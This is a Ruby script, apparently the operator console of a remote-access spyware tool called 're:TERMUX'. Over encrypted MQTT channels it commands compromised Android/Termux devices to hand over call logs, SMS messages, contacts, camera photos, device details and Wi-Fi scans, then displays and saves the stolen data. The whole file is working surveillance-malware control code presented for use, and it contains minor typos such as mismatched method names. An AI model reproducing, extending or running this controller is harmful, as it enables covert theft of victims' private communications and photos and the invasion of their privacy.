
require 'securerandom'

require_relative 're'

params = {
  :id => SecureRandom.hex(2)
}
audio_info = {}
battery_status = {}
call_log = []
camera_info = {}
contacts = []
sms_list = []
device_info = {}
wifi_connection_info = {}
wifi_scan_info = {}

re = Re.new

re.internals[:ui].render_banner('re:TERMUX')

re.internals[:optparse].program_name = "re:termux"
re.internals[:optparse].version = "0.0.1"
re.internals[:optparse].on('-b', '--bushi',  '=BUSHI',  'target bushi')
re.internals[:optparse].on('-i', '--id',     '=ID',     'id of remote shell')
re.internals[:optparse].parse!(into: params)

re.internals[:rsa].config({
  :encoded_key => File.read('re.key')
})

re.internals[:digest].config({
	:digest => 'md5'
})

re.add_topics({
  :nil                              => "bu/nil",
  :bushi									          => "bu/bushi/#{params[:bushi]}",
  :termux														=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}",
	:termux_cmd_audio_info						=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/audio_info",
	:termux_cmd_battery_status				=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/battery_status",
	:termux_cmd_call_log							=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/call_log",
	:termux_cmd_camera_info						=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/camera_info",
	:termux_cmd_camera_photo					=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/camera_photo",
	:termux_cmd_contact_list					=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/contact_list",
	:termux_cmd_sms_list							=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/sms_list",
	:termux_cmd_device_info						=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/device_info",
	:termux_cmd_wifi_connection_info	=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/wifi_connection_info",
	:termux_cmd_wifi_scan_info				=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/cmd/wifi_scan_info",
  :termux_evt_open									=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/open",
  :termux_evt_close									=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/close",
	:termux_evt_audio_info						=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/audio_info",
	:termux_evt_battery_status				=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/battery_status",
	:termux_evt_call_log							=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/call_log",
	:termux_evt_camera_info						=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/camera_info",
	:termux_evt_camera_photo					=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/camera_photo",
	:termux_evt_contact_list					=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/contact_list",
	:termux_evt_sms_list							=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/sms_list",
	:termux_evt_device_info						=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/device_info",
	:termux_evt_wifi_connection_info	=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/wifi_connection_info",
	:termux_evt_wifi_scan_info				=> "bu/bushi/#{params[:bushi]}/bushido/termux/#{params[:id]}/evt/wifi_scan_info"
})

re.add_packets({
  :open                   => { :id => params[:id] },
  :close                  => { :id => params[:id] },
  :audio_info             => { :id => params[:id] },
  :call_log               => { :id => params[:id], :limit => 10969, :offset => 0 },
  :battery_status         => { :id => params[:id] },
  :camera_info            => { :id => params[:id] },
  :camera_photo           => { :id => params[:id], :camera_id => 1, :output_file => 'capture.jpg' },
  :contact_list           => { :id => params[:id] },
  :sms_list               => { :id => params[:id], :limit => 10969, :offset => 0, :type => 'all' },
  :device_info            => { :id => params[:id] },
  :wifi_connection_info   => { :id => params[:id] },
  :wifi_scan_info         => { :id => params[:id] }
})

re.add_topic_callback(:bushi) do |message|
  packet = re.decoryse(message.payload)
  puts packet.to_yaml

  case packet[:status]
  when 'online'
    re.internals[:aes].config({
      :key_length => 128,
      :mode => :CTR,
      :key => packet[:aes]['key'],
      :iv => packet[:aes]['iv']
    })

    packet = re.packets(:open)
    packet = re.seen(packet)
    re.publish(:termux, packet, false, 2)
  when 'offline'
    exit
  end
end

re.add_topic_callback(:termux_evt_open) do |message|
  packet = re.decryse(message.payload)
  puts packet.to_yaml

  re.internals[:ui].on :render_termux do |prompt|
    case prompt
    when 'l'
      packet = re.packets(:call_log)
      packet = re.seen(packet)
      re.publish(:termux_cmd_call_log, packet, false, 2)
    when 's'
      packet = re.packets(:sms_list)
      packet = re.seen(packet)
      re.publish(:termux_cmd_sms_list, packet, false, 2)
    when 'c'
      packet = re.packets(:contact_list)
      packet = re.seen(packet)
      re.publish(:termux_cmd_contact_list, packet, false, 2)
    when 'm'
      packet = re.packets(:camera_photo)
      packet = re.seen(packet)
      re.publish(:termux_cmd_camera_photo, packet, false, 2)
    end
  end

  prompt = re.internals[:ui].render_termux_ui()

  # packet = re.packets(:audio_info)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_audio_info, packet, false, 2)
  #
  # packet = re.packets(:battery_status)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_battery_status, packet, false, 2)
  #
  # packet = re.packets(:call_log)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_call_log, packet, false, 2)
  #
  # packet = re.packets(:camera_info)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_camera_info, packet, false, 2)
  #
  # packet = re.packets(:camera_photo)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_camera_photo, packet, false, 2)
  #
  # packet = re.packets(:contact_list)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_contact_list, packet, false, 2)
  #
  # packet = re.packets(:sms_list)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_sms_list, packet, false, 2)
  #
  # packet = re.packets(:device_info)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_device_info, packet, false, 2)
  #
  # packet = re.packets(:wifi_connection_info)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_wifi_connection_info, packet, false, 2)
  #
  # packet = re.packets(:wifi_scan_info)
  # packet = re.seen(packet)
  # re.publish(:termux_cmd_wifi_scan_info, packet, false, 2)
end

re.add_topic_callback(:termux_evt_close) do |message|
  packet = re.decryse(message.payload)
  puts "termux.closed #{packet.id}"
end

re.add_topic_callback(:termux_evt_audio_info) do |message|
  packet = re.decryse(message.payload)
  puts packet.data
end

re.add_topic_callback(:termux_evt_battery_status) do |message|
  packet = re.decryse(message.payload)
  puts packet.data
end

re.add_topic_callback(:termux_evt_call_log) do |message|
  packet = re.decryse(message.payload)
  prompt = re.internals[:ui].render_call_log(packet.data)
  re.internals[:ui].render_termux_ui()
end

re.add_topic_callback(:termux_evt_camera_info) do |message|
  packet = re.decryse(message.payload)
  puts packet.data
end

re.add_topic_callback(:termux_evt_camera_photo) do |message|
  packet = re.decryse(message.payload)
  File.write('caputre.jpg', packet.data)
  re.internals[:ui].render_termux_ui()
end

re.add_topic_callback(:termux_evt_contact_list) do |message|
  packet = re.decryse(message.payload)
  re.internals[:ui].render_contacts(packet.data)
  re.internals[:ui].render_termux_ui()
end

re.add_topic_callback(:termux_evt_sms_list) do |message|
  packet = re.decryse(message.payload)
  re.internals[:ui].render_sms_list(packet.data)
  re.internals[:ui].render_termux_ui()
end

re.add_topic_callback(:termux_evt_device_info) do |message|
  packet = re.decryse(message.payload)
  puts packet.data
end

re.add_topic_callback(:termux_evt_wifi_connection_info) do |message|
  packet = re.decryse(message.payload)
  puts packet.data
end

re.add_topic_callback(:termux_evt_wifi_scan_info) do |message|
  packet = re.decryse(message.payload)
  puts packet.data
end


END {
  packet = re.packets(:close)
  packet = re.seen(packet)
  re.publish(:termux_cmd_close, packet, false, 2)
  loop do
    re.internals[:mqtt].mqtt_loop
  end
}

last_ping_time = Time.now
loop do
  sleep 0.1
	begin
		if re.internals[:mqtt].connected? then
			re.internals[:mqtt].mqtt_loop
			if last_ping_time <= Time.now - re.internals[:mqtt].keep_alive then
				re.ping
				last_ping_time = Time.now
			end
		else
			re.connect() if !re.connecting?
		end
	rescue StandardError => error
    puts error.full_message
    re.connect() if !re.connecting?
	end
end
